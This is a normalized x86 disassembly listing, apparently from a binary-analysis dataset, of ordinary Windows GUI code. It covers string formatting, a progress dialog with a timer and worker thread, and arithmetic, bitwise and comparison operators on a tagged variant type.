jne r-xdata
jmp r-xdata
push r--data
lea eax [ esp + 0xc0 ]
push eax
call [ lstrcpyA@IAT ]
mov edi [ esp + 0x1c ]
mov ebx [ wsprintfA@IAT ]
mov eax [ esp + 0x10 ]
push eax
call sub_4358c0
mov edi [ esp + 0x20 ]
add esp 0x4
push eax
push ebp
push esi
push ebx
mov ecx edi
call sub_444100
xor ecx ecx
mov cl [ rw-data ]
push eax
push esi
push ecx
mov ecx edi
call sub_4440b0
mov ebx [ wsprintfA@IAT ]
push eax
lea edx [ esp + 0xcc ]
push r--data
push edx
call ebx
add esp 0x18
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xc0 ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea ecx [ eax + 0x1 ]
lea eax [ esp + 0xbc ]
lea edx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov edx [ esp + 0x10 ]
push edx
call sub_4358c0
add esp 0x4
push eax
xor eax eax
mov al [ rw-data ]
push ebp
push esi
mov ecx edi
push eax
call sub_444100
test eax eax
mov [ esp + 0x18 ] eax
fild [ esp + 0x18 ]
jge r-xdata
fmul [ rw-data ]
push ecx
fstp [ esp ]
call sub_452500
xor ecx ecx
mov cl [ rw-data ]
add esp 0x4
push eax
push esi
push ecx
mov ecx edi
call sub_4440b0
test eax eax
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
jge r-xdata
fadd [ r--data ]
fmul [ rw-data ]
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
push eax
lea edx [ esp + 0xcc ]
push r--data
push edx
call ebx
lea eax [ esp + 0xd4 ]
add esp 0x18
lea ecx [ eax + 0x1 ]
fadd [ r--data ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea eax [ esp + 0xc0 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
push 0x1
lea ecx [ esp + 0xc0 ]
push ecx
push esi
push 0x0
mov ecx edi
call sub_444100
push esi
push 0x0
mov ecx edi
mov ebp eax
call sub_4440b0
imul ebp eax
imul ebp [ esp + 0x44 ]
shr ebp 0x3
push 0x0
push ebp
call sub_4359e0
lea eax [ esp + 0xcc ]
add esp 0x10
lea ecx [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea edx [ esp + 0xc0 ]
push edx
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov esi [ rw-data ]
test esi esi
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x10 ] edx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
imul eax eax 0x70
mov ecx [ eax + esi + 0x34 ]
add eax esi
push ecx
lea edx [ esp + 0xc0 ]
push r--data
push edx
call ebx
lea eax [ esp + 0xc8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x24 ]
push r--data
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xc0 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
cmp [ esp + 0x38 ] 0x10
mov eax [ esp + 0x24 ]
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov ecx [ esp + 0x4cc ]
push eax
mov eax [ esp + 0x44 ]
push 0x0
push 0xc
add eax 0x200
push eax
push ecx
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov ebp [ esp + 0x4cc ]
mov ebx [ GetDlgItem@IAT ]
lea eax [ esp + 0x24 ]
sub_4377f0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
setne al
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
push 0x0
push sub_4365a0
push eax
push 0xe7
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
push 0x5
push eax
mov [ rw-data ] eax
call [ ShowWindow@IAT ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
setne al
retn
sub_437860
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov ebx [ edi + 0x10 ]
xor esi esi
test ebx ebx
jle r-xdata
jge r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
add edx esi
test edx edx
jg r-xdata
mov al [ edi + 0x18 ]
test al al
jne r-xdata
cmp esi ebx
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test esi esi
je r-xdata
dec esi
mov ecx [ rw-data ]
lea edx [ ecx + esi - 0x1 ]
push edx
call sub_4a9250
add esp 0x4
test al al
je r-xdata
mov al [ edi + 0x18 ]
test al al
jne r-xdata
push esi
call sub_4a9250
add esp 0x4
test al al
je r-xdata
mov eax [ edi + 0x14 ]
push edi
push 0x0
push 0x1401
push eax
call [ PostMessageA@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
retn 0x4
mov al [ edi + 0x18 ]
test al al
jne r-xdata
mov eax [ edi + 0x20 ]
dec esi
inc eax
mov eax [ rw-data ]
lea ecx [ eax + esi - 0x2 ]
push ecx
call sub_4a9250
add esp 0x4
test al al
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add eax esi
dec ecx
cmp eax ecx
jge r-xdata
mov esi 0x1
mov [ edi + 0x10 ] esi
mov [ rw-data ] 0x0
mov eax [ edi + 0x20 ]
sub esi 0x2
add eax 0x2
jmp r-xdata
push eax
call sub_4a9250
add esp 0x4
test al al
je r-xdata
cmp esi ebx
mov [ edi + 0x20 ] eax
jg r-xdata
mov eax [ edi + 0x20 ]
inc esi
inc eax
mov edx [ rw-data ]
lea eax [ edx + esi + 0x1 ]
push eax
call sub_4a9250
add esp 0x4
test al al
je r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
lea edx [ ecx + esi + 0x1 ]
dec eax
cmp edx eax
jge r-xdata
mov eax [ edi + 0x20 ]
add esi 0x2
add eax 0x2
jmp r-xdata
cmp esi ebx
mov [ edi + 0x20 ] eax
jl r-xdata
sub_4379a0
mov eax [ esp + 0x8 ]
sub esp 0x20
cmp eax 0x111
push ebx
push esi
push edi
ja r-xdata
cmp eax 0x113
je r-xdata
je r-xdata
mov ebx [ esp + 0x30 ]
push 0xffffffeb
push ebx
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi + 0x20 ]
push 0x0
cdq
push 0x0
mov edi eax
push 0xdd7
xor edi edx
push ebx
sub edi edx
call [ GetDlgItemInt@IAT ]
cmp eax edi
je r-xdata
cmp eax 0x1401
je r-xdata
movzx eax [ esp + 0x38 ]
sub eax 0x2
jne r-xdata
sub eax 0x2
je r-xdata
mov al [ esi + 0x4 ]
test al al
jne r-xdata
push 0x0
push edi
push 0xdd7
push ebx
call [ SetDlgItemInt@IAT ]
mov edx [ esi + 0x20 ]
push 0x0
push edx
push 0x402
push 0xdd6
push ebx
call [ SendDlgItemMessageA@IAT ]
mov edi [ esp + 0x30 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov edx [ esi + 0x1c ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ esi + 0x1c ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x38 ]
push ecx
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x20
retn 0x10
mov edi [ esp + 0x30 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi + 0x1c ]
push 0xffffffff
push eax
mov [ esi + 0x18 ] 0x1
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0x1c ]
push ecx
call [ CloseHandle@IAT ]
push 0x1
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
mov edx [ esp + 0x30 ]
push 0x1
push edx
call [ KillTimer@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
sub eax 0x10e
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
call [ GetTickCount@IAT ]
sub eax [ esi ]
cmp eax 0x1f4
jbe r-xdata
mov edi [ esp + 0x3c ]
mov esi [ esp + 0x30 ]
push ebp
push edi
push 0xffffffeb
push esi
call [ SetWindowLongA@IAT ]
lea eax [ esp + 0x10 ]
push eax
push esi
call [ GetParent@IAT ]
mov ebx [ GetWindowRect@IAT ]
push eax
call ebx
lea ecx [ esp + 0x20 ]
push ecx
push esi
call ebx
mov ebp [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
sub eax ebp
sub eax ecx
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x1c ]
mov ebp eax
mov eax [ esp + 0x24 ]
sar ebp 0x1
add ebp ecx
sub eax [ esp + 0x2c ]
mov ecx [ esp + 0x14 ]
sub eax ecx
add eax edx
cdq
sub eax edx
lea edx [ esp + 0x10 ]
mov ebx eax
push edx
sar ebx 0x1
push esi
add ebx ecx
call [ GetWindowRect@IAT ]
push 0x4
push 0x0
push 0x0
push ebx
push ebp
push 0x0
push esi
call [ SetWindowPos@IAT ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov ebx [ SetDlgItemInt@IAT ]
sub eax ecx
mov ecx [ esp + 0x1c ]
push 0x1
push 0x0
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x1c ]
push 0xdd7
sub ecx eax
push esi
mov [ edi + 0xc ] ecx
call ebx
mov edx [ edi + 0x10 ]
push 0x1
push edx
push 0xdd8
push esi
call ebx
push 0xdd6
push esi
call [ GetDlgItem@IAT ]
mov ecx eax
mov eax [ edi + 0x10 ]
cdq
xor eax edx
sub eax edx
movzx eax ax
shl eax 0x10
push eax
push 0x0
push 0x401
push ecx
call [ SendMessageA@IAT ]
push 0x0
push 0x14
push 0x1
push esi
call [ SetTimer@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push 0x0
push edi
push sub_437860
push 0x0
push 0x0
mov [ edi + 0x18 ] 0x0
mov [ edi + 0x14 ] esi
mov [ edi + 0x20 ] 0x0
call sub_4b638f
add esp 0x18
test eax eax
mov [ edi + 0x1c ] eax
pop ebp
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
push 0x6
push eax
push ecx
push 0x0
push 0x0
push 0x0
push ebx
call [ SetWindowPos@IAT ]
mov [ esi + 0x4 ] 0x1
push 0xfffffff7
push esi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
sub_437c70
mov eax [ rw-data ]
sub esp 0x24
push esi
mov esi [ esp + 0x2c ]
dec eax
cmp esi eax
jl r-xdata
call [ GetTickCount@IAT ]
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] al
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x4 ]
push eax
mov eax [ rw-data ]
push sub_4379a0
push eax
push 0xc24
push 0xfffffffa
push eax
mov [ esp + 0x2c ] esi
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
mov eax [ esp + 0x14 ]
pop esi
add esp 0x24
retn
mov esi eax
sub_437cd0
movsx eax [ ecx ]
cmp eax 0x62
je r-xdata
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x66
je r-xdata
movzx edx [ edx + 0x4 ]
movzx eax [ ecx + 0x4 ]
sub eax edx
setne dl
mov [ ecx + 0x4 ] dl
cmp eax 0x66
je r-xdata
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x69
jne r-xdata
movzx eax [ ecx + 0x4 ]
mov [ esp + 0x4 ] eax
mov [ ecx ] 0x66
fild [ esp + 0x4 ]
fsub [ edx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
movzx eax [ edx + 0x4 ]
mov [ esp + 0x4 ] eax
fild [ esp + 0x4 ]
fsubr [ ecx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x66
je r-xdata
retn 0x4
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
mov [ ecx ] ax
movzx eax [ ecx + 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
fld [ ecx + 0x4 ]
fsub [ edx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
movzx edx [ edx + 0x4 ]
sub [ ecx + 0x4 ] edx
retn 0x4
cmp eax 0x66
je r-xdata
fild [ edx + 0x4 ]
fsubr [ ecx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
fild [ ecx + 0x4 ]
mov [ ecx ] 0x66
fsub [ edx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
mov eax [ edx + 0x4 ]
sub [ ecx + 0x4 ] eax
retn 0x4
sub_437dc0
movsx eax [ ecx ]
cmp eax 0x62
je r-xdata
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x66
je r-xdata
movzx edx [ edx + 0x4 ]
movzx eax [ ecx + 0x4 ]
imul edx eax
test edx edx
setne dl
mov [ ecx + 0x4 ] dl
cmp eax 0x66
je r-xdata
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x69
jne r-xdata
movzx eax [ ecx + 0x4 ]
mov [ esp + 0x4 ] eax
mov [ ecx ] 0x66
fild [ esp + 0x4 ]
fmul [ edx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
movzx eax [ edx + 0x4 ]
mov [ esp + 0x4 ] eax
fild [ esp + 0x4 ]
fmul [ ecx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x66
je r-xdata
retn 0x4
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
mov [ ecx ] ax
movzx eax [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
imul edx eax
mov [ ecx + 0x4 ] edx
retn 0x4
fld [ edx + 0x4 ]
fmul [ ecx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
movzx edx [ edx + 0x4 ]
imul edx [ ecx + 0x4 ]
mov [ ecx + 0x4 ] edx
retn 0x4
cmp eax 0x66
je r-xdata
fild [ edx + 0x4 ]
fmul [ ecx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
fild [ ecx + 0x4 ]
mov [ ecx ] 0x66
fmul [ edx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
mov eax [ edx + 0x4 ]
imul eax [ ecx + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_437ec0
push esi
mov esi [ esp + 0x8 ]
mov ax [ esi ]
cmp ax 0x76
je r-xdata
pop esi
retn 0x4
cmp ax 0x73
je r-xdata
cmp ax 0x62
jne r-xdata
cmp ax 0x69
jne r-xdata
mov dl [ esi + 0x4 ]
test dl dl
je r-xdata
movsx edx [ ecx ]
cmp edx 0x62
je r-xdata
mov edx [ esi + 0x4 ]
test edx edx
je r-xdata
movsx eax ax
cmp eax 0x62
je r-xdata
cmp edx 0x66
je r-xdata
movzx eax [ ecx + 0x4 ]
movzx esi [ esi + 0x4 ]
cdq
idiv esi
test eax eax
setne al
mov [ ecx + 0x4 ] al
cmp eax 0x66
je r-xdata
movsx eax ax
cmp eax 0x62
je r-xdata
cmp edx 0x69
jne r-xdata
movzx edx [ ecx + 0x4 ]
mov [ esp + 0x8 ] edx
mov [ ecx ] 0x66
fild [ esp + 0x8 ]
fdiv [ esi + 0x4 ]
pop esi
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
movzx eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
pop esi
fild [ esp + 0x4 ]
fdivr [ ecx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x66
je r-xdata
movsx eax ax
cmp eax 0x62
je r-xdata
mov [ ecx ] ax
movzx eax [ ecx + 0x4 ]
cdq
idiv [ esi + 0x4 ]
pop esi
mov [ ecx + 0x4 ] eax
retn 0x4
fld [ ecx + 0x4 ]
fdiv [ esi + 0x4 ]
pop esi
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax 0x69
jne r-xdata
movzx esi [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cdq
idiv esi
pop esi
mov [ ecx + 0x4 ] eax
retn 0x4
cmp eax 0x66
je r-xdata
fild [ esi + 0x4 ]
pop esi
fdivr [ ecx + 0x4 ]
fstp [ ecx + 0x4 ]
retn 0x4
fild [ ecx + 0x4 ]
mov [ ecx ] 0x66
fdiv [ esi + 0x4 ]
pop esi
fstp [ ecx + 0x4 ]
retn 0x4
cmp eax edx
jne r-xdata
mov eax [ ecx + 0x4 ]
cdq
idiv [ esi + 0x4 ]
pop esi
mov [ ecx + 0x4 ] eax
retn 0x4
sub_438000
push esi
mov esi [ esp + 0x8 ]
mov ax [ esi ]
cmp ax 0x76
je r-xdata
pop esi
retn 0x4
cmp ax 0x73
je r-xdata
cmp ax 0x62
jne r-xdata
cmp ax 0x69
jne r-xdata
mov dl [ esi + 0x4 ]
test dl dl
je r-xdata
movsx edx [ ecx ]
cmp edx 0x62
je r-xdata
mov edx [ esi + 0x4 ]
test edx edx
je r-xdata
movsx eax ax
cmp eax 0x62
je r-xdata
cmp edx 0x69
jne r-xdata
movzx eax [ ecx + 0x4 ]
movzx esi [ esi + 0x4 ]
cdq
idiv esi
test edx edx
setne al
mov [ ecx + 0x4 ] al
cmp eax 0x69
jne r-xdata
movsx eax ax
cmp eax 0x62
je r-xdata
mov [ ecx ] ax
movzx eax [ ecx + 0x4 ]
cdq
idiv [ esi + 0x4 ]
pop esi
mov [ ecx + 0x4 ] edx
retn 0x4
movzx esi [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cdq
idiv esi
pop esi
mov [ ecx + 0x4 ] edx
retn 0x4
cmp eax edx
jne r-xdata
mov eax [ ecx + 0x4 ]
cdq
idiv [ esi + 0x4 ]
pop esi
mov [ ecx + 0x4 ] edx
retn 0x4
sub_4380b0
push esi
mov esi ecx
movsx eax [ esi ]
cmp eax 0x62
push edi
je r-xdata
mov ecx [ esp + 0xc ]
movsx eax [ ecx ]
cmp eax 0x62
je r-xdata
cmp eax 0x66
je r-xdata
mov al [ ecx + 0x4 ]
and [ esi + 0x4 ] al
cmp eax 0x66
je r-xdata
mov edi [ esp + 0xc ]
movsx eax [ edi ]
cmp eax 0x62
je r-xdata
cmp eax 0x69
jne r-xdata
mov [ esi ] 0x69
fld [ ecx + 0x4 ]
call sub_4b64c4
movzx edx [ esi + 0x4 ]
and eax edx
pop edi
mov [ esi + 0x4 ] eax
pop esi
retn 0x4
cmp eax 0x69
jne r-xdata
fld [ esi + 0x4 ]
mov [ esi ] 0x69
movzx edi [ edi + 0x4 ]
call sub_4b64c4
and edi eax
mov [ esi + 0x4 ] edi
pop edi
pop esi
retn 0x4
cmp eax 0x66
je r-xdata
pop edi
pop esi
retn 0x4
mov ecx [ esp + 0xc ]
movsx eax [ ecx ]
cmp eax 0x62
je r-xdata
mov [ esi ] ax
movzx eax [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
and ecx eax
pop edi
mov [ esi + 0x4 ] ecx
pop esi
retn 0x4
mov [ esi ] 0x69
fld [ edi + 0x4 ]
call sub_4b64c4
fld [ esi + 0x4 ]
mov edi eax
call sub_4b64c4
and edi eax
mov [ esi + 0x4 ] edi
pop edi
pop esi
retn 0x4
cmp eax 0x69
jne r-xdata
movzx ecx [ ecx + 0x4 ]
mov eax [ esi + 0x4 ]
and eax ecx
pop edi
mov [ esi + 0x4 ] eax
pop esi
retn 0x4
cmp eax 0x66
je r-xdata
fld [ esi + 0x4 ]
mov [ esi ] ax
call sub_4b64c4
mov edx [ edi + 0x4 ]
and edx eax
pop edi
mov [ esi + 0x4 ] edx
pop esi
retn 0x4
fld [ ecx + 0x4 ]
call sub_4b64c4
mov ecx [ esi + 0x4 ]
and ecx eax
pop edi
mov [ esi + 0x4 ] ecx
pop esi
retn 0x4
cmp eax 0x69
jne r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ esi + 0x4 ]
and ecx eax
pop edi
mov [ esi + 0x4 ] ecx
pop esi
retn 0x4
sub_4381e0
movsx eax [ ecx ]
cmp eax 0x62
je r-xdata
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x69
jne r-xdata
mov al [ edx + 0x4 ]
or [ ecx + 0x4 ] al
cmp eax 0x69
jne r-xdata
retn 0x4
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
mov [ ecx ] ax
movzx eax [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
or edx eax
mov [ ecx + 0x4 ] edx
retn 0x4
movzx edx [ edx + 0x4 ]
or [ ecx + 0x4 ] edx
retn 0x4
cmp eax 0x69
jne r-xdata
mov eax [ edx + 0x4 ]
or [ ecx + 0x4 ] eax
retn 0x4
sub_438240
movsx eax [ ecx ]
cmp eax 0x62
je r-xdata
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x69
jne r-xdata
mov al [ edx + 0x4 ]
xor [ ecx + 0x4 ] al
cmp eax 0x69
jne r-xdata
retn 0x4
mov edx [ esp + 0x4 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
mov [ ecx ] ax
movzx eax [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
xor edx eax
mov [ ecx + 0x4 ] edx
retn 0x4
movzx edx [ edx + 0x4 ]
xor [ ecx + 0x4 ] edx
retn 0x4
cmp eax 0x69
jne r-xdata
mov eax [ edx + 0x4 ]
xor [ ecx + 0x4 ] eax
retn 0x4
sub_4382a0
movsx eax [ ecx ]
cmp eax 0x62
push esi
je r-xdata
mov eax [ esp + 0x8 ]
movsx edx [ eax ]
cmp edx 0x62
je r-xdata
cmp eax 0x66
je r-xdata
mov dl [ ecx + 0x4 ]
cmp dl [ eax + 0x4 ]
sbb eax eax
neg eax
pop esi
retn 0x4
cmp edx 0x66
je r-xdata
mov edx [ esp + 0x8 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x69
jne r-xdata
movzx ecx [ ecx + 0x4 ]
mov [ esp + 0x8 ] ecx
fild [ esp + 0x8 ]
fcomp [ eax + 0x4 ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x69
je r-xdata
movzx eax [ edx + 0x4 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fcomp [ ecx + 0x4 ]
fnstsw ax
test ah 0x41
jne r-xdata
cmp eax 0x66
je r-xdata
xor al al
pop esi
retn 0x4
mov edx [ esp + 0x8 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
xor eax eax
pop esi
retn 0x4
mov eax 0x1
pop esi
retn 0x4
movzx ecx [ ecx + 0x4 ]
mov esi [ eax + 0x4 ]
xor edx edx
cmp ecx esi
setl dl
mov al dl
pop esi
retn 0x4
mov eax 0x1
pop esi
retn 0x4
fld [ ecx + 0x4 ]
fcomp [ edx + 0x4 ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax 0x69
jne r-xdata
movzx edx [ edx + 0x4 ]
mov esi [ ecx + 0x4 ]
xor eax eax
cmp esi edx
setl al
pop esi
retn 0x4
cmp eax 0x66
je r-xdata
fild [ edx + 0x4 ]
fcomp [ ecx + 0x4 ]
fnstsw ax
test ah 0x41
jne r-xdata
fild [ ecx + 0x4 ]
fcomp [ ecx + 0x4 ]
fnstsw ax
test ah 0x41
jne r-xdata
cmp eax 0x69
jne r-xdata
mov eax 0x1
pop esi
retn 0x4
mov eax 0x1
pop esi
retn 0x4
mov eax [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
xor ecx ecx
cmp eax esi
setl cl
mov al cl
pop esi
retn 0x4
sub_4383d0
movsx eax [ ecx ]
cmp eax 0x62
push esi
je r-xdata
mov eax [ esp + 0x8 ]
movsx edx [ eax ]
cmp edx 0x62
je r-xdata
cmp eax 0x66
je r-xdata
mov dl [ ecx + 0x4 ]
cmp [ eax + 0x4 ] dl
sbb eax eax
neg eax
pop esi
retn 0x4
cmp edx 0x66
je r-xdata
mov edx [ esp + 0x8 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
cmp eax 0x69
jne r-xdata
movzx ecx [ ecx + 0x4 ]
mov [ esp + 0x8 ] ecx
fild [ esp + 0x8 ]
fcomp [ eax + 0x4 ]
fnstsw ax
test ah 0x41
jne r-xdata
cmp edx 0x69
je r-xdata
movzx eax [ edx + 0x4 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fcomp [ ecx + 0x4 ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x66
je r-xdata
xor al al
pop esi
retn 0x4
mov edx [ esp + 0x8 ]
movsx eax [ edx ]
cmp eax 0x62
je r-xdata
xor eax eax
pop esi
retn 0x4
mov eax 0x1
pop esi
retn 0x4
movzx ecx [ ecx + 0x4 ]
mov esi [ eax + 0x4 ]
xor edx edx
cmp ecx esi
setg dl
mov al dl
pop esi
retn 0x4
mov eax 0x1
pop esi
retn 0x4
fld [ ecx + 0x4 ]
fcomp [ edx + 0x4 ]
fnstsw ax
test ah 0x41
je r-xdata
cmp eax 0x69
jne r-xdata
movzx edx [ edx + 0x4 ]
mov esi [ ecx + 0x4 ]
xor eax eax
cmp esi edx
setg al
pop esi
retn 0x4
cmp eax 0x66
je r-xdata
fild [ edx + 0x4 ]
fcomp [ ecx + 0x4 ]
fnstsw ax
test ah 0x5
jpe r-xdata
fild [ ecx + 0x4 ]
fcomp [ ecx + 0x4 ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x69
jne r-xdata
mov eax 0x1
pop esi
retn 0x4
mov eax 0x1
pop esi
retn 0x4
mov eax [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
xor ecx ecx
cmp eax esi
setg cl
mov al cl
pop esi
retn 0x4
sub_438540
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0138
push eax
mov [ fs : 0x0 ] esp
push 0xffffffff
push 0x0
lea eax [ esp + 0x18 ]
mov [ ecx ] 0x73
push eax
add ecx 0x8
mov [ esp + 0x14 ] 0x0
call sub_401dd0
cmp [ esp + 0x28 ] 0x10
jb r-xdata
mov ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0xc
retn 0x1c
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_4385a0
sub esp 0x104
push esi
mov esi ecx
movsx eax [ esi ]
add eax 0xffffff9e
cmp eax 0x11
ja r-xdata
pop esi
add esp 0x104
retn 0x4
movzx eax [ eax + lookup_table_4387d4 ]
jmp [ eax * 4 + jump_table_4387c0 ]
mov eax [ esp + 0x10c ]
movsx ecx [ eax ]
cmp ecx 0x62
je r-xdata
mov eax [ esp + 0x10c ]
movsx ecx [ eax ]
cmp ecx 0x62
je r-xdata
mov eax [ esp + 0x10c ]
movsx ecx [ eax ]
cmp ecx 0x62
je r-xdata
mov ecx [ esp + 0x10c ]
movsx eax [ ecx ]
add eax 0xffffff9e
cmp eax 0x11
ja r-xdata
movzx ecx [ esi + 0x4 ]
movzx eax [ eax + 0x4 ]
add eax ecx
setne dl
mov [ esi + 0x4 ] dl
pop esi
add esp 0x104
retn 0x4
cmp ecx 0x66
je r-xdata
movzx ecx [ eax + 0x4 ]
add [ esi + 0x4 ] ecx
pop esi
add esp 0x104
retn 0x4
